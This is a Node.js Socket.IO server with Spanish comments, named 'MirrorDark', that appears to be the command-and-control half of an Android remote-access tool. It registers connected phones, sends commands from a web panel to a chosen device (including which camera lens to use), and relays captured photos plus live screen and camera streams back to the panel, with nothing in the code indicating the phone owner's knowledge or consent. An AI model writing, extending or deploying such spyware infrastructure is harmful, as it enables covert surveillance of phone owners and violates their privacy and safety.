const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static('public'));

let connectedDevices = new Map(); // Guardará socket.id -> info del celular

io.on('connection', (socket) => {
    console.log(`[+] Conexión establecida: ${socket.id}`);

    // 👇 AGREGA ESTO: Si alguien abre la web, envíale inmediatamente la lista de los que ya están conectados
    socket.emit('update_devices', Array.from(connectedDevices.values()));
    
    // El celular se registra al abrir la app
    socket.on('register_phone', (data) => {
        connectedDevices.set(socket.id, {
            id: socket.id,
            name: data.name || `Android Device (${socket.id.substring(0, 4)})`,
            ip: socket.handshake.address
        });
        console.log(`[📱] Celular registrado: ${socket.id}`);
        io.emit('update_devices', Array.from(connectedDevices.values()));
    });

    // Enviar comando dirigido a un celular específico desde el panel web (incluyendo parámetros extra como la lente)
    socket.on('send_command_to_device', (data) => {
        console.log(`[>] Enviando comando (${data.action}) al celular: ${data.targetId}`);
        io.to(data.targetId).emit('command_to_phone', { 
            action: data.action, 
            lens: data.lens || 'back' 
        });
    });

    // Recibir la respuesta del celular (ej. la foto) y mandarla a la web
    socket.on('phone_response', (response) => {
        console.log(`[<] Respuesta recibida del celular: ${socket.id}`);
        io.emit('phone_response', { ...response, deviceId: socket.id });
    });

    // Transmisión de pantalla en tiempo real
    socket.on('screen_frame', (base64Frame) => {
        io.emit('screen_frame', { deviceId: socket.id, frame: base64Frame });
    });

    // Transmisión de cámara en tiempo real
    socket.on('camera_frame', (base64Frame) => {
        io.emit('camera_frame', { deviceId: socket.id, frame: base64Frame });
    });

    socket.on('disconnect', () => {
        if (connectedDevices.has(socket.id)) {
            connectedDevices.delete(socket.id);
            console.log(`[-] Celular desconectado: ${socket.id}`);
            io.emit('update_devices', Array.from(connectedDevices.values()));
        } else {
            console.log(`[-] Panel web desconectado: ${socket.id}`);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor MirrorDark corriendo en el puerto ${PORT}`);
});